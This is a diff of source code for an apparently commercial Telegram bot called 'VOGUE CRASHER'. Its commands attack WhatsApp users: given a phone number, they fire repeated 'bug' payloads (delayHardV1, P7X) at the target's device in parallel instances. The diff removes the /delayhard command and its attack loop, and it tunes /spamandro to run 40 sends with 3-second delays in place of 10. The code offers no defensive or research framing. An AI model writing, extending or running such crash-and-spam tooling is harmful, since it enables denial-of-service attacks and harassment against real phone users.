@@ -1117,8 +1117,7 @@ Prefix      : /
 
 A N D R O I D
 /spamandro  : Hard Delay Invisible 70%
-/hardspam   : Delay Hard Invisible 1000%
-/delayhard  : Delay Hard Invisible  100%
+/hardspam   : Delay Hard Invisible 1000% (RISK)
 
 ──────────────────────────
 
@@ -2382,145 +2381,6 @@ been successfully analyzed.
 // ALL BUG COMMAND
 // ==========================================
 
-bot.command('delayhard', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
-    
-    let args = ctx.message?.text?.split(" ");
-    
-    let q = args[1];
-    
-    let executionCount =
-        parseInt(args[2]) || 1;
-    
-    if (executionCount > 20) {
-        executionCount = 20;
-    }
-    
-    if (!q) return ctx.reply(
-        `Invalid Format
-
-Usage:
-/delayhard <target_number> <amount>
-
-Example:
-/delayhard 628xxxxxxxx 50`
-    );
-    
-    let target =
-        q.replace(/[^0-9]/g, "") +
-        "@s.whatsapp.net";
-    
-    try {
-        
-        const sent =
-            await ctx.replyWithPhoto(
-                thumbnailUrl,
-                {
-                    caption: `
-<pre>
-V O G U E  •  C R A S H E R
-──────────────────────────
-
-EXECUTION STATUS
-
-Target      : ${q}
-Execution   : ${executionCount}x
-Status      : Active
-
-──────────────────────────
-Dispatch engine initialized.
-</pre>`,
-                    parse_mode: "HTML",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: "Check Target",
-                                    url: `https://wa.me/${q}`,
-                                    style: "primary"
-                                }
-                            ]
-                        ]
-                    }
-                }
-            );
-        
-        (async () => {
-
-            const instanceBase = Date.now();
-        
-            const totalInstances = executionCount;
-        
-            const createInstance = async (instanceIndex) => {
-        
-                const instanceId = `${instanceBase}-${instanceIndex}`;
-        
-                try {
-        
-                    for (let i = 0; i < 15; i++) {
-        
-                        try {
-        
-                            if (!sock) {
-                                throw new Error("Socket unavailable");
-                            }
-        
-                            await delayHardV1(sock, target);
-                            await sleep(1000)
-        
-                            console.log(
-                                `[INSTANCE ${instanceId}] Exec ${i + 1}/20`
-                            );
-        
-                        } catch (e) {
-        
-                            console.log(
-                                `[INSTANCE ${instanceId}] Error: ${e.message}`
-                            );
-        
-                            autoRestartOn408(e);
-                        }
-                    }
-        
-                    console.log(
-                        `[INSTANCE ${instanceId}] DONE`
-                    );
-        
-                } catch (err) {
-        
-                    console.log(
-                        `[INSTANCE ${instanceId}] FAILED: ${err.message}`
-                    );
-                }
-            };
-        
-            const allInstances = Array.from(
-                { length: totalInstances },
-                (_, i) => createInstance(i + 1)
-            );
-        
-            await Promise.allSettled(allInstances);
-        
-            console.log(
-                `[SYSTEM] All ${totalInstances} instances completed`
-            );
-        
-        })();
-        
-    } catch (error) {
-        
-        ctx.reply(
-            `Operation Failed
-
-The system was unable to execute the requested module.
-Please verify the target input and system status before retrying.`
-        );
-        
-        console.log(
-            `[VOGUE CRASHER] Execution failed for ${q}`
-        );
-    }
-});
-
 bot.command('spamandro', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
@@ -2673,7 +2533,7 @@ Dispatch engine initialized.
         
                 try {
         
-                    for (let i = 0; i < 10; i++) {
+                    for (let i = 0; i < 40; i++) {
         
                         try {
         
@@ -2682,7 +2542,7 @@ Dispatch engine initialized.
                             }
         
                             await P7X(sock, target);
-                            await sleep(1000)
+                            await sleep(3000)
         
                             console.log(
                                 `[INSTANCE ${instanceId}] Exec ${i + 1}/20`
